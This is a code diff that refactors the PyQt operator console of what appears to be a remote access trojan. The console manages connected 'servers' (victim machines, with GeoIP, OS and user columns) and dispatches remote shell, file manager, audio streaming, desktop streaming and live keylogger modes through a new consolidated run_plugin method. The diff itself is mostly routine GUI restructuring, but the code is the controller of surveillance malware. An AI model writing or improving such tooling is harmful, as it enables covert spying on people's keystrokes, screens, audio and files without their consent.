@@ -27,7 +27,6 @@ from plugins.mshell import main as mshell
 from plugins.mdesktop import main as mdesktop
 from plugins.mkeylogger import main as mkeylogger
 
-
 # initial geo ip database
 geo_ip_database = pygeoip.GeoIP('assets\\GeoIP.dat')
 
@@ -102,7 +101,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         # initialize servers table columns width
         self.serversTable.setColumnWidth(self.index_of_ipAddress, 100)
         self.serversTable.setColumnWidth(self.index_of_socket, 50)
-        self.serversTable.setColumnWidth(self.index_of_lock, 80)
+        self.serversTable.setColumnWidth(self.index_of_lock, 90)
         self.serversTable.setColumnWidth(self.index_of_os, 90)
         self.serversTable.setColumnWidth(self.index_of_user, 90)
         self.serversTable.setColumnWidth(self.index_of_version, 50)
@@ -110,7 +109,8 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         self.serversTable.doubleClicked.connect(self.unlock_server)
         # Initializing right click menu
         self.serversTable.setContextMenuPolicy(Qt.CustomContextMenu)
-        self.connect(self.serversTable, SIGNAL('customContextMenuRequested(const QPoint&)'), self.server_right_click_menu)
+        self.connect(self.serversTable, SIGNAL('customContextMenuRequested(const QPoint&)'),
+                     self.server_right_click_menu)
 
         # Triggers
         self.startListenButton.clicked.connect(self.listen_start)
@@ -122,12 +122,12 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         self.unlockServerButton.clicked.connect(self.unlock_server)
         self.lockServerButton.clicked.connect(self.lock_server)
         self.quitServerButton.clicked.connect(self.lock_server)
-        self.remoteShellButton.clicked.connect(self.run_shell)
-        self.remoteExplorerButton.clicked.connect(self.run_explorer)
-        self.remoteAudioButton.clicked.connect(self.run_audio)
-        self.remoteDesktopButton.clicked.connect(self.run_desktop)
-        self.remoteDesktopButton2.clicked.connect(self.run_desktop)
-        self.remoteKeyloggerButton.clicked.connect(self.run_keylogger)
+        self.remoteShellButton.clicked.connect(lambda: self.run_plugin('shellMode'))
+        self.remoteExplorerButton.clicked.connect(lambda: self.run_plugin('explorerMode'))
+        self.remoteAudioButton.clicked.connect(lambda: self.run_plugin('audioMode'))
+        self.remoteDesktopButton.clicked.connect(lambda: self.run_plugin('desktopMode'))
+        self.remoteDesktopButton2.clicked.connect(lambda: self.run_plugin('desktopMode'))
+        self.remoteKeyloggerButton.clicked.connect(lambda: self.run_plugin('keyloggerMode'))
 
         # Custom signal for update server table
         self.connect(self, SIGNAL('updateTable()'), self.updateServersTable)
@@ -240,7 +240,6 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
                             i = int(index)
 
                             if mode == 'streamingMode':
-
                                 data = get(self.sock, 'pcinfo', 'info')
                                 info = ast.literal_eval(data)
 
@@ -290,7 +289,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
                                       zlib.decompress(screen_info['screenshotbits']), 'raw', 'BGRX', 0, 1)
                 screen_bits = im.convert('RGBA')
                 self.previewLabel.setPixmap(QPixmap.fromImage(ImageQt.ImageQt(screen_bits)).scaled(
-                self.previewLabel.size(), Qt.KeepAspectRatio))
+                        self.previewLabel.size(), Qt.KeepAspectRatio))
             except SyntaxError:
                 pass
 
@@ -414,28 +413,32 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
 
     def server_right_click_menu(self, point):
         server_index = self.serversTable.currentRow()
-        self.eMenu = QMenu(self)
-        self.optionsMenu = QMenu('Server Options', self)
-        self.optionsMenu.setIcon(QIcon(os.path.join(assets, 'settings.png')))
+        server_menu = QMenu(self)
+        server_options_menu = QMenu('Server Options', self)
+        server_options_menu.setIcon(QIcon(os.path.join(assets, 'settings.png')))
 
         if self.serversTable.item(server_index, self.index_of_lock).text() == 'LOCKED':
-            self.eMenu.addAction(QIcon(os.path.join(assets, 'unlock.png')), 'Unlock Server', self.unlock_server)
+            server_menu.addAction(QIcon(os.path.join(assets, 'unlock.png')), 'Unlock Server', self.unlock_server)
 
         else:
-            self.eMenu.addAction(QIcon(os.path.join(assets, 'mshell.png')), 'Shell', self.run_shell)
-            self.eMenu.addAction(QIcon(os.path.join(assets, 'mexplorer.png')), 'File Manager',
-                                 self.run_explorer)
-            self.eMenu.addAction(QIcon(os.path.join(assets, 'maudio.png')), 'Audio Streaming', self.run_audio)
-            self.eMenu.addAction(QIcon(os.path.join(assets, 'mdesktop.png')), 'Desktop Streaming', self.run_desktop)
-            self.eMenu.addAction(QIcon(os.path.join(assets, 'mkeylogger.png')), 'Live Keylogger', self.run_keylogger)
+            server_menu.addAction(QIcon(os.path.join(assets, 'mshell.png')), 'Shell',
+                                  lambda: self.run_plugin('shellMode'))
+            server_menu.addAction(QIcon(os.path.join(assets, 'mexplorer.png')), 'File Manager',
+                                  lambda: self.run_plugin('explorerMode'))
+            server_menu.addAction(QIcon(os.path.join(assets, 'maudio.png')), 'Audio Streaming',
+                                  lambda: self.run_plugin('audioMode'))
+            server_menu.addAction(QIcon(os.path.join(assets, 'mdesktop.png')), 'Desktop Streaming',
+                                  lambda: self.run_plugin('desktopMode'))
+            server_menu.addAction(QIcon(os.path.join(assets, 'mkeylogger.png')), 'Live Keylogger',
+                                  lambda: self.run_plugin('keyloggerMode'))
 
-            self.eMenu.addSeparator()
-            self.eMenu.addMenu(self.optionsMenu)
-            self.optionsMenu.addAction(QIcon(os.path.join(assets, 'lock.png')), 'Lock Server',
-                                       self.lock_server)
-            self.optionsMenu.addAction(QIcon(os.path.join(assets, 'stop.png')), 'Terminate Server',
-                                       self.lock_server)
-        self.eMenu.exec_(self.serversTable.mapToGlobal(point))
+            server_menu.addSeparator()
+            server_menu.addMenu(server_options_menu)
+            server_options_menu.addAction(QIcon(os.path.join(assets, 'lock.png')), 'Lock Server',
+                                          self.lock_server)
+            server_options_menu.addAction(QIcon(os.path.join(assets, 'stop.png')), 'Terminate Server',
+                                          self.lock_server)
+        server_menu.exec_(self.serversTable.mapToGlobal(point))
 
     # get item
     def current_server(self):
@@ -479,30 +482,10 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
                 self.pluginsBank[plugin_id] = plugins[plugin].mainPopup(args)
                 self.pluginsBank[plugin_id].show()
 
-    def run_shell(self):
+    def run_plugin(self, mode):
         server = self.current_server()
         if server:
-            send(self.socks[server]['sock'], 'startChildSocket %s' % server, 'shellMode')
-
-    def run_explorer(self):
-        server = self.current_server()
-        if server:
-            send(self.socks[server]['sock'], 'startChildSocket %s' % server, 'explorerMode')
-
-    def run_audio(self):
-        server = self.current_server()
-        if server:
-            send(self.socks[server]['sock'], 'startChildSocket %s' % server, 'audioMode')
-
-    def run_desktop(self):
-        server = self.current_server()
-        if server:
-            send(self.socks[server]['sock'], 'startChildSocket %s' % server, 'desktopMode')
-
-    def run_keylogger(self):
-        server = self.current_server()
-        if server:
-            send(self.socks[server]['sock'], 'startChildSocket %s' % server, 'keyloggerMode')
+            send(self.socks[server]['sock'], 'startChildSocket %s' % server, mode)
 
     def closeEvent(self, event):
         sys.exit(1)
